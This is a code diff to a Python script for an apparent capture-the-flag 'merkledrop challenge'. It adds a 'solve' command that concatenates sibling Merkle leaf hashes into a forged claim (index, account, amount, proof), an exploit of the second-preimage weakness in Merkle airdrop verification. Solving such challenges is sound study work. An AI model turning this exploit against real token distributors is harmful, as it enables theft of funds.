@@ -2,6 +2,8 @@ import argparse
 import json
 
 from brownie import network
+from eth_abi.packed import encode_packed
+from hexbytes import HexBytes
 from web3 import Web3
 
 from . import MerkleDistributor, MerkleProof, Setup, Token
@@ -35,7 +37,7 @@ def score_validation(args: argparse.Namespace):
     sum_individual = 0
     for address, info in merkle_tree["claims"].items():
         individual_amount = int(info["amount"], 16)
-        individual_amounts[address] = individual_amount
+        individual_amounts[address] = individual_amount/10**18
         sum_individual += individual_amount
 
     print(token_total, sum_individual)
@@ -112,6 +114,35 @@ def claim_all(args: argparse.Namespace):
         proof = claim_info["proof"]
         distributor.claim(index, address, amount, proof, tx_config)
 
+def solve_this_shit(args: argparse.Namespace):
+    with open(args.infile) as ifp:
+        merkle_tree = json.load(ifp)
+
+    parents = {}
+    for address, claim_info in merkle_tree["claims"].items():
+        parent_hash = claim_info["proof"][1]
+        if parents.get(parent_hash) is None:
+            parents[parent_hash] = []
+        parents[parent_hash].append((address, claim_info))
+
+    for parent_hash in parents:
+        _, leaf_0_info = parents[parent_hash][0]
+        _, leaf_1_info = parents[parent_hash][1]
+
+        leaf_0_leafhash = leaf_1_info["proof"][0]
+        leaf_1_leafhash = leaf_0_info["proof"][0]
+
+        payload = [HexBytes(leaf_0_leafhash), HexBytes(leaf_1_leafhash)]
+        if int(leaf_1_leafhash, 16) < int(leaf_0_leafhash, 16):
+            payload = [HexBytes(leaf_1_leafhash), HexBytes(leaf_0_leafhash)]
+
+        attack_data = encode_packed(["bytes32", "bytes32"], payload).hex()
+        attack_index = int(attack_data[:64], 16)
+        attack_account = attack_data[64:104]
+        attack_amount = int(attack_data[104:], 16)
+
+        print(f"Index: {attack_index}, account: {attack_account}, amount: {attack_amount} (Small enough? {attack_amount <= 75000000000000000000000}, equal? {attack_amount == 75000000000000000000000}), proof: {' '.join(leaf_0_info['proof'][1:])}")
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="merkledrop challenge")
     subparsers = parser.add_subparsers()
@@ -165,6 +196,10 @@ if __name__ == "__main__":
     MerkleDistributor.add_default_arguments(claim_all_parser, True)
     claim_all_parser.add_argument("infile")
     claim_all_parser.set_defaults(func=claim_all)
+
+    solve_parser = subparsers.add_parser("solve")
+    solve_parser.add_argument("infile")
+    solve_parser.set_defaults(func=solve_this_shit)
 
     args = parser.parse_args()
     args.func(args)
